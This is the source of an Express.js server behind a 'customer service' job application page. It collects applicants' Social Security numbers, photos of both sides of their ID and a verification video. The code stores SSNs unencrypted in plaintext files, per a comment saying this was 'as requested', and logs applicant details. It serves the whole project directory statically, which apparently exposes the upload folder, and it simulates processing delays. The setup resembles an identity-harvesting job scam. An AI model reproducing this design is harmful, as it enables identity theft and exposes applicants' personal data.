const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { uploadToFirebase, initializeFirebase } = require('./firebase-config');

const app = express();
const PORT = process.env.PORT || 8000;

// Initialize Firebase on startup
initializeFirebase();

// Ensure uploads directory exists for application info files
const uploadsDir = path.join(__dirname, 'backend', 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files - serve everything from root
app.use(express.static(__dirname));

// File upload configuration - use memory storage for Firebase uploads
const storage = multer.memoryStorage();

const upload = multer({ 
  storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Allow images for ID uploads and video for verification
    const imageTypes = /jpeg|jpg|png|gif|webp/;
    const videoTypes = /mp4|webm|mov/;
    const extname = path.extname(file.originalname).toLowerCase();
    
    if (file.fieldname === 'video') {
      const isValidVideo = videoTypes.test(extname.substring(1)) || file.mimetype.startsWith('video/');
      if (isValidVideo) {
        return cb(null, true);
      } else {
        return cb(new Error('Only MP4, WebM, and MOV video files are allowed'));
      }
    } else {
      // For ID uploads (idFront, idBack)
      const isValidImage = imageTypes.test(extname.substring(1)) || file.mimetype.startsWith('image/');
      if (isValidImage) {
        return cb(null, true);
      } else {
        return cb(new Error('Only image files are allowed for ID uploads'));
      }
    }
  }
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Health check endpoint - Enhanced for Railway
app.get('/health', (req, res) => {
  try {
    // Check if uploads directory exists and is writable
    const uploadsCheck = fs.existsSync(uploadsDir);
    
    res.json({ 
      status: 'OK', 
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      port: PORT,
      uploadsDir: uploadsCheck ? 'Ready' : 'Creating...',
      firebase: process.env.FIREBASE_SERVICE_ACCOUNT ? 'Configured' : 'Not configured',
      uptime: process.uptime()
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(500).json({
      status: 'ERROR',
      message: 'Health check failed',
      error: error.message
    });
  }
});

// Application submission endpoint
app.post('/api/submit-application', upload.fields([
  { name: 'idFront', maxCount: 1 },
  { name: 'idBack', maxCount: 1 },
  { name: 'video', maxCount: 1 }
]), async (req, res) => {
  try {
    const { name, email, phone, firstName, lastName, experience, schedule, location, ssn } = req.body;
    const files = req.files;
    
    // Create folder name for local application info
    const fullName = `${firstName} ${lastName}`;
    const safeFolderName = fullName
      .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
      .replace(/\s+/g, '-') // Replace spaces with hyphens
      .toLowerCase();
    
    const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
    const applicantFolder = `${timestamp}_${safeFolderName}`;
    const applicantDir = path.join(uploadsDir, applicantFolder);
    
    // Create local directory for application info
    if (!fs.existsSync(applicantDir)) {
      fs.mkdirSync(applicantDir, { recursive: true });
    }

    // Upload files to Firebase and get URLs
    const fileUrls = {};
    
    if (files && files.idFront) {
      try {
        const frontIdUrl = await uploadToFirebase(
          files.idFront[0].buffer, 
          `front-id${path.extname(files.idFront[0].originalname)}`,
          applicantFolder
        );
        fileUrls.frontId = frontIdUrl;
      } catch (error) {
        console.error('Failed to upload front ID:', error);
      }
    }

    if (files && files.idBack) {
      try {
        const backIdUrl = await uploadToFirebase(
          files.idBack[0].buffer, 
          `back-id${path.extname(files.idBack[0].originalname)}`,
          applicantFolder
        );
        fileUrls.backId = backIdUrl;
      } catch (error) {
        console.error('Failed to upload back ID:', error);
      }
    }

    if (files && files.video) {
      try {
        const videoUrl = await uploadToFirebase(
          files.video[0].buffer, 
          `verification-video${path.extname(files.video[0].originalname)}`,
          applicantFolder
        );
        fileUrls.video = videoUrl;
      } catch (error) {
        console.error('Failed to upload video:', error);
      }
    }
    
    // Create application info with Firebase URLs
    const applicationInfo = {
      timestamp: new Date().toISOString(),
      applicantName: `${firstName} ${lastName}`,
      email: email,
      phone: phone,
      location: location,
      experience: experience,
      schedule: schedule,
      ssn: ssn || 'Not provided', // Store SSN unencrypted as requested
      applicationId: 'APP-' + Date.now(),
      filesUploaded: {
        idFront: files && files.idFront ? 'Yes' : 'No',
        idBack: files && files.idBack ? 'Yes' : 'No',
        video: files && files.video ? 'Yes' : 'No'
      },
      firebaseUrls: fileUrls
    };
    
    // Save application info to local text file
    const infoFilePath = path.join(applicantDir, 'application-info.txt');
    const infoText = `CUSTOMER SERVICE APPLICATION
========================================

Applicant Information:
- Full Name: ${applicationInfo.applicantName}
- Email: ${applicationInfo.email}
- Phone: ${applicationInfo.phone}
- Location: ${applicationInfo.location}
- Experience Level: ${applicationInfo.experience}
- Preferred Schedule: ${applicationInfo.schedule}
- SSN: ${applicationInfo.ssn}

Application Details:
- Application ID: ${applicationInfo.applicationId}
- Submission Date: ${applicationInfo.timestamp}
- Folder: ${applicantFolder}

Files Uploaded:
- Front ID: ${applicationInfo.filesUploaded.idFront}
- Back ID: ${applicationInfo.filesUploaded.idBack}
- Verification Video: ${applicationInfo.filesUploaded.video}

Firebase File URLs:
- Front ID URL: ${fileUrls.frontId || 'Not uploaded'}
- Back ID URL: ${fileUrls.backId || 'Not uploaded'}
- Video URL: ${fileUrls.video || 'Not uploaded'}

Status: Pending Review
========================================`;

    fs.writeFileSync(infoFilePath, infoText);
    
    console.log('=== New Application Received ===');
    console.log('Applicant:', applicationInfo.applicantName);
    console.log('Local Folder Created:', applicantFolder);
    console.log('Email:', email);
    console.log('Phone:', phone);
    console.log('Firebase Files:');
    if (fileUrls.frontId) console.log('- Front ID:', fileUrls.frontId);
    if (fileUrls.backId) console.log('- Back ID:', fileUrls.backId);
    if (fileUrls.video) console.log('- Video:', fileUrls.video);
    console.log('Info saved to:', infoFilePath);
    console.log('================================');
    
    // Simulate processing time
    setTimeout(() => {
      res.json({ 
        success: true, 
        message: 'Application submitted successfully! We will contact you within 24 hours.',
        applicationId: applicationInfo.applicationId,
        applicantFolder: applicantFolder,
        fileUrls: fileUrls,
        nextSteps: [
          'Check your email for confirmation',
          'Prepare for a brief phone screening',
          'Review job details and requirements'
        ]
      });
    }, 1500);
    
  } catch (error) {
    console.error('Application submission error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'There was an error processing your application. Please try again.' 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'File too large. Please upload files smaller than 10MB.'
      });
    }
    if (error.code === 'MISSING_FIELD_NAME') {
      return res.status(400).json({
        success: false,
        message: 'Invalid file upload. Please ensure all required files are properly selected.'
      });
    }
  }
  
  console.error('Server error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error. Please try again later.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Customer Service Landing Page Server running on port ${PORT}`);
  console.log(`📍 Local URL: http://localhost:${PORT}`);
  console.log(`📁 Serving static files from: ${__dirname}`);
  console.log(`📤 Upload directory: ${uploadsDir}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔧 Railway Deploy: ${process.env.RAILWAY_ENVIRONMENT_NAME || 'local'}`);
  
  // Ensure uploads directory exists with proper permissions
  try {
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
      console.log(`✅ Created uploads directory: ${uploadsDir}`);
    }
    console.log(`✅ Server startup complete - Ready to accept connections`);
  } catch (error) {
    console.error(`❌ Error setting up uploads directory:`, error);
  }
}); 